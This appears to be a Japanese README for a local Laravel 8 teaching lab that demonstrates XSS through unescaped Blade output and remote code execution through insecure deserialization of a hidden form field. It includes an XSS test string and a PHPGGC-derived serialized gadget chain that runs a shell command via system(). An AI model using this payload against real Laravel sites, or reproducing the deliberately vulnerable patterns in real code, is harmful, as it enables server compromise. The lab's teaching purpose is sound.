## 環境

- PHP 7.4.23
- Laravel 8.61.0
## セットアップ

https://readouble.com/laravel/8.x/ja/sail.html

```bash
# Bashエイリアスを設定後

## 起動
sail up
sail down
```

## 説明
### XSS(クロスサイトスクリプティング)
`http://localhost/xss`

ユーザーの入力からJavaScriptが実行される様子を確認したい。

Bladeの`{{ }}`は、出力値に対してPHPのhtmlspecialchars関数を通すことでエスケープしXSS攻撃を防いでいる。ところが、改行したいなどの理由で`{{ }}`を使わない場合、`{!! !!}`をそのまま使ってしまうとXSS攻撃にさらされてしまう。

エスケープの有無、改行の有無と4つのパターンを用意。

フォームの初期値は以下。
```txt
<script>alert(1)</script>
a
a
```

### 安全でないデシリアライゼーション
`http://localhost/serialization/`

安全でないデシリアライゼーションでリモートコードが実行される様子を観測する。

確認画面から保存処理へのあいだ、データをhiddenパラメータ経由で受け渡す。そこで配列をフラットにするためにデータをデシリアライズした、という設定。

`touch /var/www/html/hacked.txt`を実行するという攻撃をしてみる。
開発者ツールからhiddenパラメーターを書き換えてvalueの値に以下を差し替える。これはPHPGGCに吐き出してもらったものを一部加工した。。
(valueの前後のダブルクオーテーションはシングルクオテーションに変更する必要がある)

```
O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:6:"events";O:25:"Illuminate\Bus\Dispatcher":1:{s:13:"queueResolver";s:6:"system";}s:5:"event";O:34:"Illuminate\Queue\CallQueuedClosure":1:{s:10:"connection";s:30:"touch /var/www/html/hacked.txt";}}
```

差し替えた上で保存ボタンを押すと、`/var/www/html/hacked.txt`が新しく作成されている。